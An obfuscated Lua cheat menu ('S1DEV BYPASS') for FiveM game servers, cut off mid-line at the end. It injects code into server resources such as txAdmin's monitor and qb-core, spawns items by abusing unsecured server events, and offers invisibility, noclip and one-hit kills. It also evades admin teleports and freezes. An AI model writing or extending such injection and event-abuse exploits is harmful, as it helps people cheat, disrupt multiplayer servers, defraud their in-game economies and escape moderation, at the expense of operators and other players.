--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local v0="1.0.4";print("S1DEV BYPASS ACTIVE");local v1=vec2(700,1725 -(942 + 283) );local v2=vec2(0 + 0 ,0 + 0 );local v3=1246 -(709 + 387) ;local v4=MachoMenuTabbedWindow("S1DEV",v2.x,v2.y,v1.x,v1.y,v3);local v5=1;local v6=1858 -(673 + 1185) ;local function v7() local v192=math.floor(((739 -484) * math.sin(v6) * 0.5) + (407.5 -280) );local v193=math.floor(((419 -164) * math.sin(v6 + 2.094 + 0 ) * (0.5 + 0)) + 127.5 );local v194=math.floor((255 * math.sin(v6 + (5.188 -1) ) * 0.5) + 32.5 + 95 );MachoMenuSetAccent(v4,v192,v193,v194);v6=v6 + 0.02 ;if (v6>(11.280000000000001 -5)) then v6=0 -0 ;end end Citizen.CreateThread(function() while true do local v491=1880 -(446 + 1434) ;while true do if (v491==(1283 -(1040 + 243))) then v7();Citizen.Wait(25);break;end end end end);MachoMenuSetKeybind(v4,107 -71 );local v8=MachoMenuAddTab(v4,"Main Menu");local v9=MachoMenuGroup(v8,"General",2267 -(559 + 1288) ,9,2641 -(609 + 1322) ,v1.y-10 );local v10=MachoMenuGroup(v8,"Tx Features",609 -(13 + 441) ,33 -24 ,1100 -680 ,v1.y-(49 -39) );local v11=false;MachoMenuCheckbox(v9,"Show/Hide ID - Safe",function() local v195=0 + 0 ;while true do if (v195==0) then v11=true;MachoMenuNotification("Menu","Show/Hide ID status: On");break;end end end,function() local v196=0 -0 ;while true do if (v196==(0 + 0)) then v11=false;MachoMenuNotification("Menu","Show/Hide ID status: Off");break;end end end);local v12=false;MachoMenuCheckbox(v10,"TX Show Player IDs",function() v12=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        menuIsAccessible = true
        toggleShowPlayerIDs(true, true)
    ]]);MachoMenuNotification("TX Admin","Showing player IDs");end,function() v12=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        menuIsAccessible = true
        toggleShowPlayerIDs(false, true)
    ]]);MachoMenuNotification("TX Admin","Hiding player IDs");end);local v13=false;MachoMenuCheckbox(v10,"Invisibility",function() local v197=0 + 0 ;while true do if (v197==(0 -0)) then v13=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        if not _G.NEVERBOKLOSEInvisibility then
            _G.NEVERBOKLOSEInvisibility = { enabled = false, wasVisible = true }
        end
        _G.NEVERBOKLOSEInvisibility.enabled = true
        local ped = PlayerPedId()
        _G.NEVERBOKLOSEInvisibility.wasVisible = IsEntityVisible(ped)
        SetEntityVisible(ped, false, false)
        
        CreateThread(function()
            while _G.NEVERBOKLOSEInvisibility and _G.NEVERBOKLOSEInvisibility.enabled do
                local currentPed = PlayerPedId()
                if currentPed and DoesEntityExist(currentPed) then
                    SetEntityVisible(currentPed, false, false)
                end
                Wait(500)
            end
        end)
    ]]);v197=1 + 0 ;end if (v197==1) then MachoMenuNotification("Invisibility","Invisibility ON");break;end end end,function() local v198=0 -0 ;while true do if (v198==(0 + 0)) then v13=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        if _G.NEVERBOKLOSEInvisibility and _G.NEVERBOKLOSEInvisibility.enabled then
            _G.NEVERBOKLOSEInvisibility.enabled = false
            local ped = PlayerPedId()
            if ped and DoesEntityExist(ped) then
                SetEntityVisible(ped, _G.NEVERBOKLOSEInvisibility.wasVisible, false)
            end
        end
    ]]);v198=1 + 0 ;end if (v198==(1 + 0)) then MachoMenuNotification("Invisibility","Invisibility OFF");break;end end end);local v14=false;local v15=false;local v16=false;local v17=false;local v18=false;local v19=false;MachoMenuCheckbox(v9,"Invisibility - Safe",function() local v199=0 + 0 ;local v200;local v201;while true do if (1==v199) then MachoInjectResource("qb-core",[[
        local playerPed = PlayerPedId()
        local playerVeh = GetVehiclePedIsIn(playerPed, false)

        -- Invisible to others
        SetEntityVisible(playerPed, false, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, true)
        SetEntityAlpha(playerPed, 0, false)

        if playerVeh ~= 0 then
            SetEntityVisible(playerVeh, false, false)
            NetworkSetEntityInvisibleToNetwork(playerVeh, true)
            SetEntityAlpha(playerVeh, 0, false)
        end

        -- Visible to yourself
        SetEntityLocallyVisible(playerPed)
        SetEntityAlpha(playerPed, 255, false)

        if playerVeh ~= 0 then
            SetEntityLocallyVisible(playerVeh)
            SetEntityAlpha(playerVeh, 255, false)
        end
    ]]);v14=true;break;end if (v199==(0 + 0)) then v200=PlayerPedId();v201=GetVehiclePedIsIn(v200,false);v199=434 -(153 + 280) ;end end end,function() local v202=PlayerPedId();local v203=GetVehiclePedIsIn(v202,false);MachoInjectResource("qb-core",[[
        local playerPed = PlayerPedId()
        local playerVeh = GetVehiclePedIsIn(playerPed, false)

        -- Make visible
        SetEntityVisible(playerPed, true, false)
        NetworkSetEntityInvisibleToNetwork(playerPed, false)
        ResetEntityAlpha(playerPed)

        if playerVeh ~= 0 then
            SetEntityVisible(playerVeh, true, false)
            NetworkSetEntityInvisibleToNetwork(playerVeh, false)
            ResetEntityAlpha(playerVeh)
        end
    ]]);v14=false;end);Citizen.CreateThread(function() while true do local v492=0 -0 ;while true do if (v492==(0 + 0)) then Citizen.Wait(0 + 0 );if v14 then local v863=PlayerPedId();local v864=GetVehiclePedIsIn(v863,false);SetEntityVisible(v863,false,false);NetworkSetEntityInvisibleToNetwork(v863,true);SetEntityAlpha(v863,0 + 0 ,false);if (v864~=(0 + 0)) then SetEntityVisible(v864,false,false);NetworkSetEntityInvisibleToNetwork(v864,true);SetEntityAlpha(v864,0 + 0 ,false);end SetEntityLocallyVisible(v863);SetEntityAlpha(v863,388 -133 ,false);if (v864~=(0 + 0)) then SetEntityLocallyVisible(v864);SetEntityAlpha(v864,255,false);end end break;end end end end);local v20=false;local v21=PlayerPedId();local v22=2;local v23="move_jump";local v24="land_roll";function LoadAnimDict(v204) local v205=667 -(89 + 578) ;while true do if (v205==(0 + 0)) then RequestAnimDict(v204);while  not HasAnimDictLoaded(v204) do Citizen.Wait(0);end break;end end end MachoMenuCheckbox(v9,"Noclip - Safe",function() local v206=0 -0 ;while true do if (v206==(1049 -(572 + 477))) then MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local fallAnimDict = "move_jump"
        local fallAnim = "land_roll"
        RequestAnimDict(fallAnimDict)
        while not HasAnimDictLoaded(fallAnimDict) do
            Citizen.Wait(0)
        end
        TaskPlayAnim(playerPed, fallAnimDict, fallAnim, 8.0, -8.0, -1, 49, 0, false, false, false)
        SetPedToRagdoll(playerPed, 1000, 1000, 0, true, true, false)
        SetEntityCollision(playerPed, false, false)
        SetEntityAlpha(playerPed, 150, false)
        SetEntityInvincible(playerPed, true)
    ]]);v20=true;break;end end end,function() local v207=0 + 0 ;while true do if (v207==0) then MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        ClearPedTasks(playerPed)
        SetEntityCollision(playerPed, true, true)
        ResetEntityAlpha(playerPed)
        SetEntityInvincible(playerPed, false)
    ]]);v20=false;break;end end end);local v12=false;MachoMenuCheckbox(v10,"TX Show Player IDs",function() local v208=0 + 0 ;while true do if (v208==(1 + 0)) then MachoMenuNotification("TX Admin","Showing player IDs");break;end if (v208==(86 -(84 + 2))) then v12=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        menuIsAccessible = true
        toggleShowPlayerIDs(true, true)
    ]]);v208=1 -0 ;end end end,function() v12=false;MachoInjectResource2(NewThreadNs,"monitor",[[
        menuIsAccessible = true
        toggleShowPlayerIDs(false, true)
    ]]);MachoMenuNotification("TX Admin","Hiding player IDs");end);MachoMenuButton(v9,"FB Clothes Shop",function() local v209=0 + 0 ;while true do if (v209==(842 -(497 + 345))) then TriggerEvent("FBClothing:client:openClothingShopMenu");MachoMenuNotification("FB Clothes","Opening clothes shop...");break;end end end);MachoMenuButton(v9,"FB Change Character",function() local v210=0;while true do if (v210==(0 + 0)) then TriggerEvent("qb-MultiCharacter:server:openui");MachoMenuNotification("FB Character","Opening character selection...");break;end end end);MachoMenuButton(v9,"FB Revive (RespectEMS)",function() TriggerEvent("RespectEMS:client:revive",true);MachoMenuNotification("FB Revive","Revive requested...");end);MachoMenuButton(v9,"FB Hospital Revive",function() TriggerEvent("hospital:client:Revive");MachoMenuNotification("FB Revive","Revive requested...");end);MachoMenuButton(v9,"FB Ambulance Revive",function() TriggerEvent("ambulancejob:client:revive");MachoMenuNotification("FB Revive","Revive requested...");end);MachoMenuButton(v9,"FB Cuff Self",function() TriggerEvent("police:client:GetCuffed", -(1 + 0));MachoMenuNotification("FB Police","Cuffed yourself");end);MachoMenuButton(v9,"FB Toggle Admin Names",function() local v211=0;while true do if (v211==(1333 -(605 + 728))) then TriggerEvent("qb-admin:client:toggleNames");MachoMenuNotification("FB Admin","Toggled admin names");break;end end end);MachoMenuButton(v9,"FB Toggle Admin Blips",function() TriggerEvent("qb-admin:client:toggleBlips");MachoMenuNotification("FB Admin","Toggled admin blips");end);MachoMenuButton(v9,"FB Open Jail Menu",function() TriggerEvent("RespectJail:client:openMenu");MachoMenuNotification("FB Jail","Opening jail menu...");end);MachoMenuButton(v9,"FB Open Police Reports",function() TriggerEvent("FB-PoliceJob:client:openReportsMenu","station");MachoMenuNotification("FB Police","Opening police reports...");end);local v25=MachoMenuInputbox(v9,"Item Name","e.g., weapon_pistol");local v26=MachoMenuInputbox(v9,"Amount","1");MachoMenuButton(v9,"Spawn Item inv",function() local v212=MachoMenuGetInputbox(v25);local v213=tonumber(MachoMenuGetInputbox(v26)) or (1 + 0) ;if (v212 and (v212~="")) then if (v213>0) then local v771=0 -0 ;while true do if (v771==(0 + 0)) then TriggerServerEvent("rt-lumberjack:server:giveItem",v212,v213);MachoMenuNotification("Item Spawn","Spawning "   .. v212   .. " x"   .. v213 );v771=1;end if (v771==(3 -2)) then print("[Item Spawn] Spawning "   .. v212   .. " x"   .. v213 );break;end end else MachoMenuNotification("Error","Please enter a valid amount!");end else MachoMenuNotification("Error","Please enter an item name!");end end);local v27=MachoMenuInputbox(v9,"22Item Name","e.g., LOCKPICK");local v28=MachoMenuInputbox(v9,"22Amount","1");MachoMenuButton(v9,"Spawn Item IN inv",function() local v214=0 + 0 ;local v215;local v216;while true do if (v214==(0 -0)) then v215=MachoMenuGetInputbox(v27);v216=tonumber(MachoMenuGetInputbox(v28)) or (1 + 0) ;v214=490 -(457 + 32) ;end if (1==v214) then if (v215 and (v215~="")) then if (v216>0) then local v923=false;pcall(function() TriggerServerEvent("rt-steal:server:giveItem",v215,v216);v923=true;end);if  not v923 then local v947=0 + 0 ;local v948;while true do if (v947==(1402 -(832 + 570))) then v948=nil;if (GetResourceState("rt-steal")=="started") then v948="rt-steal";elseif (GetResourceState("monitor")=="started") then v948="monitor";elseif (GetResourceState("qb-core")=="started") then v948="qb-core";else v948="ox_inventory";end v947=1 + 0 ;end if (v947==(1 + 0)) then MachoInjectResource2(NewThreadNs,v948,string.format([[
                    local itemName = "%s"
                    local amount = %d
                    TriggerServerEvent('rt-steal:server:giveItem', itemName, amount)
                    print("RT Steal Item: Spawned " .. itemName .. " x" .. amount)
                    TriggerEvent('chat:addMessage', { args = { '^2RT Steal:', 'Spawned ' .. itemName .. ' x' .. amount } })
                ]],v215,v216));break;end end end MachoMenuNotification("RT Steal","Spawning "   .. v215   .. " x"   .. v216 );print("[RT Steal] Spawning "   .. v215   .. " x"   .. v216 );else MachoMenuNotification("Error","Please enter a valid amount!");end else MachoMenuNotification("Error","Please enter an item name!");end break;end end end);MachoMenuButton(v9,"FB Clothes",function() local v217=0;while true do if (v217==(0 -0)) then TriggerEvent("FBClothing:client:openOutfitMenu");MachoMenuNotification("FB Clothes","Opening FB outfit menu...");break;end end end);MachoMenuButton(v9,"FB Revive",function() local v218=0 + 0 ;while true do if (v218==(796 -(588 + 208))) then TriggerEvent("FB_Ems:triggers:client:revivePlayer");MachoMenuNotification("FB Revive","Revive requested...");break;end end end);MachoMenuButton(v9,"rc2 Revive",function() TriggerEvent("hospital:client:Revive");MachoMenuNotification("Hospital","Revive requested...");end);MachoMenuButton(v9,"s1 Teleport to Waypoint",function() local v219=0 -0 ;local v220;while true do if (v219==(1800 -(884 + 916))) then v220=GetFirstBlipInfoId(8);if  not DoesBlipExist(v220) then MachoMenuNotification("s1","No waypoint set!");else local v798=GetBlipInfoIdCoord(v220);local v799=PlayerPedId();local v800=v799;if IsPedInAnyVehicle(v799,false) then v800=GetVehiclePedIsIn(v799,false);end SetEntityCoordsNoOffset(v800,v798.x,v798.y,v798.z,false,false,false,false);MachoMenuNotification("s1","Teleported to waypoint!");end break;end end end);local v29=false;MachoMenuCheckbox(v9,"s1 Super Jump",function() local v221=0 -0 ;while true do if (v221==(0 + 0)) then v29=true;MachoMenuNotification("s1","Super Jump ON");break;end end end,function() v29=false;MachoMenuNotification("s1","Super Jump OFF");end);local v30=656 -(232 + 421) ;local v31=MachoMenuSlider(v9,"s1 Fast Run Speed",v30,1890 -(1569 + 320) ,3 + 7 ,"x",1,function(v222) v30=v222;end);local v32=false;MachoMenuCheckbox(v9,"s1 Fast Run",function() local v223=0;while true do if ((0 + 0)==v223) then v32=true;MachoMenuNotification("s1","Fast Run ACTIVE (Speed: "   .. v30   .. "x)" );v223=3 -2 ;end if (1==v223) then Citizen.CreateThread(function() local v772=0;while true do if (v772==0) then while v32 do local v932=605 -(316 + 289) ;while true do if (v932==(0 -0)) then Citizen.Wait(0 + 0 );SetPedMoveRateOverride(PlayerPedId(),v30 + (1453 -(666 + 787)) );break;end end end SetPedMoveRateOverride(PlayerPedId(),1);break;end end end);break;end end end,function() v32=false;SetPedMoveRateOverride(PlayerPedId(),426 -(360 + 65) );MachoMenuNotification("s1","Fast Run OFF");end);local v33=false;MachoMenuCheckbox(v9,"s1 No Ragdoll",function() v33=true;SetPedCanRagdoll(PlayerPedId(),false);MachoMenuNotification("s1","No Ragdoll ON");end,function() local v224=0 + 0 ;while true do if (v224==1) then MachoMenuNotification("s1","No Ragdoll OFF");break;end if (v224==0) then v33=false;SetPedCanRagdoll(PlayerPedId(),true);v224=1;end end end);local v34=false;MachoMenuCheckbox(v9,"s1 Anti AFK",function() local v225=254 -(79 + 175) ;while true do if ((0 -0)==v225) then v34=true;MachoMenuNotification("s1","Anti AFK ACTIVE");v225=1 + 0 ;end if (v225==(2 -1)) then Citizen.CreateThread(function() while v34 do Citizen.Wait(9629 -4629 );local v801=PlayerPedId();local v802=GetEntityCoords(v801);SetEntityCoordsNoOffset(v801,v802.x + (899.01 -(503 + 396)) ,v802.y + 0.01 ,v802.z,false,false,false,false);end end);break;end end end,function() local v226=0;while true do if ((181 -(92 + 89))==v226) then v34=false;MachoMenuNotification("s1","Anti AFK OFF");break;end end end);local v35=false;MachoMenuCheckbox(v9,"s1 Infinite Stamina",function() local v227=0 -0 ;while true do if (v227==0) then v35=true;MachoMenuNotification("s1","Infinite Stamina ACTIVE");v227=1;end if (v227==(1 + 0)) then Citizen.CreateThread(function() while v35 do local v803=0 + 0 ;while true do if (v803==0) then Citizen.Wait(1958 -1458 );ResetPlayerStamina(PlayerPedId());break;end end end end);break;end end end,function() local v228=0 + 0 ;while true do if (v228==0) then v35=false;MachoMenuNotification("s1","Infinite Stamina OFF");break;end end end);local v36=false;MachoMenuCheckbox(v9,"s1 Infinite Oxygen",function() v36=true;SetPedDiesInWater(PlayerPedId(),false);MachoMenuNotification("s1","Infinite Oxygen ON");end,function() v36=false;SetPedDiesInWater(PlayerPedId(),true);MachoMenuNotification("s1","Infinite Oxygen OFF");end);local v37=false;MachoMenuCheckbox(v9,"s1 Disable Collision",function() local v229=0;while true do if (v229==1) then MachoMenuNotification("s1","Disable Collision ON");break;end if (v229==0) then v37=true;SetEntityCollision(PlayerPedId(),false,false);v229=2 -1 ;end end end,function() v37=false;SetEntityCollision(PlayerPedId(),true,true);MachoMenuNotification("s1","Disable Collision OFF");end);local v38=false;MachoMenuCheckbox(v9,"s1 Fast Punch",function() v38=true;MachoMenuNotification("s1","Fast Punch ON");end,function() local v230=0 + 0 ;while true do if (v230==(0 + 0)) then v38=false;MachoMenuNotification("s1","Fast Punch OFF");break;end end end);local v39=false;MachoMenuCheckbox(v9,"s1 Super Punch",function() local v231=0;while true do if (v231==(2 -1)) then MachoMenuNotification("s1","Super Punch ON (One-hit kill)");break;end if (v231==(0 + 0)) then v39=true;SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"),1525016 -525016 );v231=1245 -(485 + 759) ;end end end,function() local v232=0 -0 ;while true do if ((1189 -(442 + 747))==v232) then v39=false;SetWeaponDamageModifier(GetHashKey("WEAPON_UNARMED"),1);v232=1;end if (v232==(1136 -(832 + 303))) then MachoMenuNotification("s1","Super Punch OFF");break;end end end);MachoMenuButton(v9,"Open face Menu",function() local v233=0;while true do if (v233==(946 -(88 + 858))) then TriggerEvent("m3-clothingmenu:client:OpenSurgeonShop");MachoMenuNotification("Clothes","Opening clothes menu...");break;end end end);MachoMenuButton(v9,"Open Barber Shop",function() TriggerEvent("m3-clothingmenu:client:OpenBarberShop");MachoMenuNotification("Barber","Opening barber shop...");end);MachoMenuButton(v9,"Open Clothing Shop",function() TriggerEvent("m3-clothingmenu:client:openClothingShopMenu");MachoMenuNotification("Clothing Shop","Opening clothing shop...");end);MachoMenuButton(v9,"RT Revive 2",function() TriggerEvent("RespectEMS:triggers:client:revivePlayer");MachoMenuNotification("RT Revive 2","Revive requested...");end);MachoMenuButton(v9,"Change Character",function() TriggerEvent("qb-MultiCharacter:server:openui");MachoMenuNotification("Character","Opening character selection...");end);MachoMenuButton(v9,"s1 Remove PTFX",function() Citizen.CreateThread(function() local v493=0 + 0 ;local v494;while true do if (v493==(1 + 0)) then RemoveParticleFxFromEntity(PlayerPedId());MachoMenuNotification("s1","Removed PTFX effects");break;end if (v493==0) then v494=GetEntityCoords(PlayerPedId());RemoveParticleFxInRange(v494.x,v494.y,v494.z,9 + 191 );v493=1;end end end);end);MachoMenuButton(v9,"s1 Stop All Sounds",function() Citizen.CreateThread(function() for v522=790 -(766 + 23) ,493 -393  do StopSound(v522);end MachoMenuNotification("s1","Stopped all sounds");end);end);MachoMenuButton(v9,"s1 Remove Admin Freeze",function() for v495=1 -0 ,4 -2  do EnableAllControlActions(v495);end FreezeEntityPosition(PlayerPedId(),false);SetEntityCollision(PlayerPedId(),false,true);Citizen.Wait(1018 -718 );SetEntityCollision(PlayerPedId(),true,true);Citizen.Wait(3573 -(1036 + 37) );if IsEntityPositionFrozen(PlayerPedId()) then local v523=0;while true do if (v523==(0 + 0)) then MachoMenuNotification("s1","Detected still frozen, trying again...");for v865=1,2 do EnableAllControlActions(v865);end v523=1 -0 ;end if (v523==1) then for v866=1 + 0 ,1490 -(641 + 839)  do FreezeEntityPosition(PlayerPedId(),false);end MachoMenuNotification("s1","Admin freeze removed");break;end end else MachoMenuNotification("s1","Admin freeze removed");end end);MachoMenuButton(v9,"s1 Remove Attached Objects",function() Citizen.CreateThread(function() local v496=913 -(910 + 3) ;local v497;local v498;while true do if (1==v496) then for v804,v805 in ipairs(v497) do if DoesEntityExist(v805) then DetachEntity(v805,true,true);v498=v498 + 1 ;end end MachoMenuNotification("s1","Removed "   .. v498   .. " attached objects" );break;end if (v496==(0 -0)) then v497=GetGamePool("CObject");v498=1684 -(1466 + 218) ;v496=1 + 0 ;end end end);end);local v40=false;MachoMenuCheckbox(v9,"s1 Disable Hostile Peds",function() v40=true;MachoMenuNotification("s1","Hostile peds disabled");Citizen.CreateThread(function() while v40 do local v524=0;while true do if (v524==0) then Citizen.Wait(0);SetPedResetFlag(PlayerPedId(),1272 -(556 + 592) ,true);v524=1;end if (v524==(1 + 0)) then SetEveryoneIgnorePlayer(PlayerPedId(),true);break;end end end end);end,function() local v234=0;while true do if (v234==(808 -(329 + 479))) then v40=false;MachoMenuNotification("s1","Hostile peds enabled");break;end end end);local v41=false;local v42=nil;MachoMenuCheckbox(v9,"s1 Evade Admin TP",function() v41=true;v42=GetEntityCoords(PlayerPedId());MachoMenuNotification("s1","Admin TP evasion activated");Citizen.CreateThread(function() while v41 do local v525=854 -(174 + 680) ;local v526;local v527;while true do if (0==v525) then Citizen.Wait(343 -243 );v526=GetEntityCoords(PlayerPedId());v525=1;end if (v525==(1 -0)) then v527= #(v42-v526);if (v527>(36 + 14)) then local v924=739 -(396 + 343) ;while true do if (v924==0) then SetEntityCoordsNoOffset(PlayerPedId(),v42.x,v42.y,v42.z,false,false,false,true);MachoMenuNotification("s1","Blocked admin teleport!");break;end end else v42=v526;end break;end end end end);end,function() local v235=0;while true do if (v235==(0 + 0)) then v41=false;MachoMenuNotification("s1","Admin TP evasion deactivated");break;end end end);local v43=false;MachoMenuCheckbox(v9,"s1 Block Admin Freeze",function() local v236=1477 -(29 + 1448) ;while true do if (v236==0) then v43=true;MachoMenuNotification("s1","Admin freeze block activated");v236=1;end if (v236==1) then Citizen.CreateThread(function() while v43 do local v806=0;while true do if (v806==(1389 -(135 + 1254))) then Citizen.Wait(0 -0 );FreezeEntityPosition(PlayerPedId(),false);break;end end end end);break;end end end,function() local v237=0 -0 ;while true do if (v237==(0 + 0)) then v43=false;MachoMenuNotification("s1","Admin freeze block deactivated");break;end end end);local v44=false;MachoMenuCheckbox(v9,"s1 Anti Fire",function() local v238=1527 -(389 + 1138) ;while true do if (v238==(575 -(102 + 472))) then Citizen.CreateThread(function() while v44 do local v807=0 + 0 ;while true do if ((0 + 0)==v807) then Citizen.Wait(0 + 0 );StopEntityFire(PlayerPedId());break;end end end end);break;end if (v238==(1545 -(320 + 1225))) then v44=true;MachoMenuNotification("s1","Anti fire activated");v238=1 -0 ;end end end,function() local v239=0;while true do if (v239==(0 + 0)) then v44=false;MachoMenuNotification("s1","Anti fire deactivated");break;end end end);local v45=false;MachoMenuCheckbox(v9,"s1 Anti Attach",function() v45=true;MachoMenuNotification("s1","Anti attach activated");Citizen.CreateThread(function() while v45 do Citizen.Wait(1464 -(157 + 1307) );for v700,v701 in ipairs(GetGamePool("CVehicle")) do if (IsEntityAttachedToAnyPed(v701) and (GetEntityAttachedTo(v701)==PlayerPedId())) then NetworkRequestControlOfEntity(v701);DetachEntity(v701,0,true);end end for v702,v703 in ipairs(GetGamePool("CObject")) do if (IsEntityAttachedToAnyPed(v703) and (GetEntityAttachedTo(v703)==PlayerPedId())) then NetworkRequestControlOfEntity(v703);DetachEntity(v703,1859 -(821 + 1038) ,true);end end end end);end,function() v45=false;MachoMenuNotification("s1","Anti attach deactivated");end);local v46=false;MachoMenuCheckbox(v9,"s1 Anti VDM",function() local v240=0 -0 ;while true do if (v240==(1 + 0)) then Citizen.CreateThread(function() while v46 do Citizen.Wait(0);local v808=PlayerPedId();local v809=GetEntityCoords(v808);for v867,v868 in ipairs(GetGamePool("CVehicle")) do if DoesEntityExist(v868) then local v933=0 -0 ;local v934;local v935;while true do if (v933==(1 + 0)) then if (v935<=50) then SetEntityNoCollisionEntity(v868,v808,true);end break;end if (0==v933) then v934=GetEntityCoords(v868);v935= #(v809-v934);v933=2 -1 ;end end end end end end);break;end if (v240==(1026 -(834 + 192))) then v46=true;MachoMenuNotification("s1","Anti VDM activated");v240=1 + 0 ;end end end,function() v46=false;MachoMenuNotification("s1","Anti VDM deactivated");end);local v47=false;MachoMenuCheckbox(v9,"s1 Anti Handcuff",function() v47=true;MachoMenuNotification("s1","Anti handcuff activated");Citizen.CreateThread(function() while v47 do Citizen.Wait(0 + 0 );EnableAllControlActions(0);EnableAllControlActions(1 + 0 );end end);end,function() local v241=0 -0 ;while true do if (v241==0) then v47=false;MachoMenuNotification("s1","Anti handcuff deactivated");break;end end end);MachoMenuButton(v9,"s1 Evade Hostage Situation",function() MachoMenuNotification("s1","Hostage evade activated");end);Citizen.CreateThread(function() while true do Citizen.Wait(304 -(300 + 4) );v21=PlayerPedId();if v20 then local v704=GetEntityCoords(v21);local v705=GetGameplayCamRot(1 + 1 );local v706=math.rad(v705.z);local v707=v22;if IsControlPressed(0,32) then v704=v704 + vector3(v707 * math.sin(v706) ,v707 *  -math.cos(v706) ,0) ;end if IsControlPressed(0 -0 ,395 -(112 + 250) ) then v704=v704 + vector3( -v707 * math.sin(v706) , -v707 *  -math.cos(v706) ,0 + 0 ) ;end if IsControlPressed(0,84 -50 ) then v704=v704 + vector3(v707 * math.cos(v706) ,v707 * math.sin(v706) ,0 + 0 ) ;end if IsControlPressed(0 + 0 ,27 + 8 ) then v704=v704 + vector3( -v707 * math.cos(v706) , -v707 * math.sin(v706) ,0 + 0 ) ;end if IsControlPressed(0 + 0 ,1435 -(1001 + 413) ) then v704=v704 + vector3(0 -0 ,882 -(244 + 638) ,v707) ;end if IsControlPressed(693 -(627 + 66) ,107 -71 ) then v704=v704 + vector3(0,0, -v707) ;end SetEntityCoordsNoOffset(v21,v704.x,v704.y,v704.z,true,true,true);if  not IsEntityPlayingAnim(v21,v23,v24,605 -(512 + 90) ) then TaskPlayAnim(v21,v23,v24,1914 -(1665 + 241) , -(725 -(373 + 344)), -(1 + 0),13 + 36 ,0 -0 ,false,false,false);end if  not IsPedRagdoll(v21) then SetPedToRagdoll(v21,1692 -692 ,2099 -(35 + 1064) ,0,true,true,false);end SetEntityRotation(v21,0,0 + 0 ,v705.z,4 -2 ,true);end end end);local v48=vector3(0 + 0 ,0,1236 -(298 + 938) );local v49=false;local v21=PlayerPedId();local v50=1259 -(233 + 1026) ;local v51=nil;local v52=false;local v53=1668 -(636 + 1030) ;local v23="move_jump";local v24="land_roll";function LoadAnimDict(v242) local v243=0;while true do if (v243==0) then RequestAnimDict(v242);while  not HasAnimDictLoaded(v242) do Citizen.Wait(0 + 0 );end break;end end end function CreateCamera() local v244=GetEntityCoords(v21,true);v48=v244 + vector3(0,0,1.5 + 0 ) ;v50=GetEntityHeading(v21);v51=CreateCam("DEFAULT_SCRIPTED_FLY_CAMERA",true);SetCamCoord(v51,v48.x,v48.y,v48.z);SetCamRot(v51,0 + 0 ,0 + 0 ,v50,223 -(55 + 166) );RenderScriptCams(true,false,0 + 0 ,true,true);v49=true;FreezeEntityPosition(v21,true);v52=true;end function DestroyCamera() if v49 then RenderScriptCams(false,false,0 + 0 ,true,true);DestroyCam(v51,false);v49=false;FreezeEntityPosition(v21,false);v52=false;end end MachoMenuCheckbox(v9,"Freecam - Safe",function() MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        local fallAnimDict = "move_jump"
        local fallAnim = "land_roll"
        RequestAnimDict(fallAnimDict)
        while not HasAnimDictLoaded(fallAnimDict) do
            Citizen.Wait(0)
        end
        TaskPlayAnim(playerPed, fallAnimDict, fallAnim, 8.0, -8.0, -1, 49, 0, false, false, false)
        SetPedToRagdoll(playerPed, 1000, 1000, 0, true, true, false)
        SetEntityCollision(playerPed, false, false)
        SetEntityAlpha(playerPed, 150, true)
        SetEntityInvincible(playerPed, true)
    ]]);CreateCamera();end,function() local v245=0 -0 ;while true do if ((297 -(36 + 261))==v245) then MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        ClearPedTasks(playerPed)
        SetEntityCollision(playerPed, true, true)
        ResetEntityAlpha(playerPed)
        SetEntityInvincible(playerPed, true)
    ]]);DestroyCamera();break;end end end);Citizen.CreateThread(function() while true do local v499=0 -0 ;while true do if (v499==(1369 -(34 + 1334))) then if v49 then local v869=GetCamCoord(v51);local v870=GetCamRot(v51,1 + 1 );local v871=math.rad(v870.z);local v872=v53;if IsControlPressed(0 + 0 ,1316 -(1035 + 248) ) then v869=v869 + vector3(v872 * math.sin(v871) ,v872 *  -math.cos(v871) ,21 -(20 + 1) ) ;end if IsControlPressed(0 + 0 ,32) then v869=v869 + vector3( -v872 * math.sin(v871) , -v872 *  -math.cos(v871) ,319 -(134 + 185) ) ;end if IsControlPressed(1133 -(549 + 584) ,720 -(314 + 371) ) then v869=v869 + vector3(v872 * math.cos(v871) ,v872 * math.sin(v871) ,0) ;end if IsControlPressed(0 -0 ,1002 -(478 + 490) ) then v869=v869 + vector3( -v872 * math.cos(v871) , -v872 * math.sin(v871) ,0) ;end if IsControlPressed(0 + 0 ,44) then v869=v869 + vector3(0,1172 -(786 + 386) ,v872) ;end if IsControlPressed(0 -0 ,1417 -(1055 + 324) ) then v869=v869 + vector3(0,1340 -(1093 + 247) , -v872) ;end SetCamCoord(v51,v869.x,v869.y,v869.z);local v873=GetDisabledControlNormal(0 + 0 ,1 + 0 ) * 0.25 ;local v874=GetDisabledControlNormal(0 -0 ,6 -4 ) *  -0.25 ;local v875=math.max( -(252 -163),math.min(223 -134 ,newCamRotX));local v876=v870.z-(v873 * v872) ;v875=math.max( -(32 + 57),math.min(342 -253 ,v875));SetCamRot(v51,v875,0,v876,6 -4 );if  not IsEntityPlayingAnim(v21,v23,v24,3 + 0 ) then TaskPlayAnim(v21,v23,v24,8, -(20 -12), -1,737 -(364 + 324) ,0 -0 ,false,false,false);end if  not IsPedRagdoll(v21) then SetPedToRagdoll(v21,1000,1000,0 -0 ,true,true,false);end end break;end if (v499==(0 + 0)) then Citizen.Wait(0 -0 );v21=PlayerPedId();v499=1;end end end end);local v54=false;local v55=nil;local v56=false;local v57=nil;local v58={"Select","Teleportation","Weapon 